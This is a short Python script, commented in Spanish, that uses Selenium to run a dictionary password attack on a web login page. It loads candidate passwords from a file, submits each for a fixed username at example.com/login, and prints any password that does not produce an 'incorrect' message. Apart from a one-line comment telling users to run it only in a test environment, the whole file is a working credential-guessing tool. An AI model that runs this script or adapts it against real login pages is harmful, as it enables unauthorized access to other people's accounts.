from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Ruta al diccionario de contraseñas
diccionario_claves = "passwords.txt"

# ⚠️ Usa entorno de prueba (NO producción)
url = "https://example.com/login"

# Configuración del WebDriver
driver = webdriver.Chrome()

# Abrir página
driver.get(url)
time.sleep(5)

# Usuario de prueba
usuario = "test_user"

# Leer las contraseñas desde archivo
with open(diccionario_claves, "r") as f:
    passwords = f.read().splitlines()

# Intentar login
for password in passwords:
    try:
        print(f"Probando: {usuario}:{password}")

        # Buscar campos
        campo_usuario = driver.find_element(By.NAME, "username")
        campo_password = driver.find_element(By.NAME, "password")

        # Limpiar campos
        campo_usuario.clear()
        campo_password.clear()

        # Ingresar datos
        campo_usuario.send_keys(usuario)
        campo_password.send_keys(password)
        campo_password.send_keys(Keys.RETURN)

        time.sleep(3)

        # Validación (depende del sistema)
        if "incorrect" not in driver.page_source:
            print(f"[+] Credenciales encontradas: {usuario}:{password}")
            break
        else:
            print("[-] Fallo en el intento")

    except Exception as e:
        print(f"[!] Error: {e}")
        continue

# Cerrar navegador
driver.quit()
